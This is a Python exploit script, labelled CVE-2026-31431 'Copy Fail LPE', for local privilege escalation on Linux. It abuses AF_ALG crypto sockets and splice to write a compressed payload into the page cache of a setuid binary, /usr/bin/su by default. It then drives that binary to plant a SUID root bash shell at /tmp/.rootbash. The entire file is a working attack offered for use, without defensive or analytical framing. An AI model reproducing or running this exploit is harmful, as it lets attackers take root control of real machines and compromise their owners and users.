#!/usr/bin/env python3
import os
import zlib
import socket
import ctypes
import subprocess
import sys

# ====================================================================
# Constants
# ====================================================================

AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_OP = 3
ALG_SET_IV = 2
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
MSG_MORE = 32768

# ====================================================================
# Banner (ASCII only, no Unicode)
# ====================================================================

print("""
  +------------------------------------------+
  |  CVE-2026-31431 - Copy Fail LPE           |
  |  AF_page-cache write by tegalxploiter     |
  +------------------------------------------+
""")

# ====================================================================
# Arguments
# ====================================================================

TARGET = sys.argv[1] if len(sys.argv) > 1 else "/usr/bin/su"
OUTPUT = "/tmp/.rootbash"

# ====================================================================
# libc setup
# ====================================================================

_libc = ctypes.CDLL("libc.so.6", use_errno=True)
_libc.splice.restype = ctypes.c_ssize_t
_libc.splice.argtypes = [
    ctypes.c_int, ctypes.POINTER(ctypes.c_long),
    ctypes.c_int, ctypes.POINTER(ctypes.c_long),
    ctypes.c_size_t, ctypes.c_uint
]

def splice(fd_in, fd_out, count, offset=None):
    if offset is not None:
        off = ctypes.c_long(offset)
        return _libc.splice(fd_in, ctypes.pointer(off), fd_out, None, count, 0)
    return _libc.splice(fd_in, None, fd_out, None, count, 0)

def d(h):
    return bytes.fromhex(h)

# ====================================================================
# Page cache patch
# ====================================================================

def patch_page_cache(fd, offset, chunk):
    # Chunk must be exactly 4 bytes
    if len(chunk) < 4:
        chunk = chunk.ljust(4, b"\x00")
    
    alg = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    
    alg.setsockopt(SOL_ALG, ALG_SET_KEY, d('0800010000000010' + '00' * 32))
    alg.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
    
    conn, _ = alg.accept()
    
    total = offset + 4
    z = b'\x00'
    
    # Send message with control data
    cmsg_op = (SOL_ALG, ALG_SET_OP, z * 4)
    cmsg_iv = (SOL_ALG, ALG_SET_IV, b'\x10' + z * 19)
    cmsg_auth = (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, b'\x08' + z * 3)
    
    conn.sendmsg(
        [b'\x00' * 4 + chunk],
        [cmsg_op, cmsg_iv, cmsg_auth],
        MSG_MORE
    )
    
    r, w = os.pipe()
    splice(fd, w, total, offset=0)
    splice(r, conn.fileno(), total)
    
    try:
        conn.recv(8 + offset)
    except Exception:
        pass
    
    os.close(r)
    os.close(w)
    conn.close()
    alg.close()

# ====================================================================
# Payload
# ====================================================================

payload_hex = (
    "78daab77f57163626464800126063b0610af82c101cc7760c004"
    "0e0c160c301d209a154d16999e07e5c1680601086578c0f0ff86"
    "4c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa4999"
    "79fac5190c0c0c0032c310d3"
)

payload = zlib.decompress(d(payload_hex))

# ====================================================================
# Main exploit
# ====================================================================

print("[*] Patching {} ({} bytes in page cache)".format(TARGET, len(payload)))

fd = os.open(TARGET, os.O_RDONLY)

i = 0
while i < len(payload):
    patch_page_cache(fd, i, payload[i:i+4])
    i += 4

os.close(fd)

print("[*] Spawning root shell -> {}".format(OUTPUT))

cmd = "cp /bin/bash {}; chmod u+s {}; id".format(OUTPUT, OUTPUT).encode() + b"\nexit\n"

try:
    proc = subprocess.Popen(
        [TARGET],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    out, _ = proc.communicate(cmd, timeout=10)
    result = out.decode(errors="replace").strip()
except Exception as e:
    result = str(e)

# Check if SUID
if os.path.exists(OUTPUT) and os.stat(OUTPUT).st_mode & 0o4000:
    print("[+] SUCCESS: {} is SUID root".format(OUTPUT))
    print("[+] {}".format(result))
    print("[*] Run: {} -p".format(OUTPUT))
else:
    print("[-] Failed. Output: {}".format(result))
